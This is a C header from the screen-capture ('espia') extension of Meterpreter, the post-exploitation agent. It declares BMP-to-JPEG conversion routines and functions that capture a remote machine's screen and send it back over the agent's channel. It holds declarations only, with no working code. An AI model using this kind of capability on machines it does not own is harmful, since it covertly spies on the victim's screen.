#ifndef _METERPRETER_SOURCE_EXTENSION_ESPIA_ESPIA_SERVER_SCREEN_H
#define _METERPRETER_SOURCE_EXTENSION_ESPIA_ESPIA_SERVER_SCREEN_H



#include "jinclude.h"
#include "jpeglib.h"
#include "jerror.h"		

/*
 * Object interface for cjpeg's source file decoding modules
 * This is the structure used to handle the converstion to a JPEG
 * The code "borrowed" from rdbmp.c example also uses this struct
 * to reference a BMP, then uses type casting trickery to change it.
 * All I have to say is "Just because you can do soemthing doesn't
 * mean you should do it". But it works, and I'm too lazy to make it
 * easier to "read". So a heads up, when you see a cjpeg_source being
 * tossed around, it might really be a BMP.  
 *
 * This structure was modified from the IJG's example to support
 * conversion in memory without using disk. 
 */
typedef struct cjpeg_source_struct * cjpeg_source_ptr;

struct cjpeg_source_struct {
  JMETHOD(void, start_input, (j_compress_ptr cinfo,
			      cjpeg_source_ptr sinfo));
  JMETHOD(JDIMENSION, get_pixel_rows, (j_compress_ptr cinfo,
				       cjpeg_source_ptr sinfo));
  JMETHOD(void, finish_input, (j_compress_ptr cinfo,
			       cjpeg_source_ptr sinfo));

  TCHAR *input_buf;
  UINT read_offset;

  JSAMPARRAY buffer;
  JDIMENSION buffer_height;
};

/* Private version of data source object */

typedef struct _bmp_source_struct * bmp_source_ptr;

typedef struct _bmp_source_struct {
  struct cjpeg_source_struct pub; /* public fields */

  j_compress_ptr cinfo;		/* back link saves passing separate parm */

  JSAMPARRAY colormap;		/* BMP colormap (converted to my format) */

  jvirt_sarray_ptr whole_image;	/* Needed to reverse row order */
  JDIMENSION source_row;	/* Current source row number */
  JDIMENSION row_width;		/* Physical width of scanlines in file */

  int bits_per_pixel;		/* remembers 8- or 24-bit format */
} bmp_source_struct;


// JPEG related functions
int ReadOK(bmp_source_ptr, char*, int);
int read_byte (bmp_source_ptr);
void read_colormap (bmp_source_ptr, int, int);
JDIMENSION get_8bit_row (j_compress_ptr, cjpeg_source_ptr);
JDIMENSION get_16bit_row (j_compress_ptr, cjpeg_source_ptr);
JDIMENSION get_24bit_row (j_compress_ptr, cjpeg_source_ptr);
JDIMENSION get_32bit_row (j_compress_ptr, cjpeg_source_ptr);
JDIMENSION preload_image (j_compress_ptr, cjpeg_source_ptr);
void start_input_bmp (j_compress_ptr, cjpeg_source_ptr);
void finish_input_bmp (j_compress_ptr, cjpeg_source_ptr);
cjpeg_source_ptr jinit_read_bmp (j_compress_ptr);

// BMP-screenshot related functions
int convert_bmp_and_send(HBITMAP, HDC, Packet*);
DWORD request_image_get_dev_screen(Remote *remote, Packet *packet);


#endif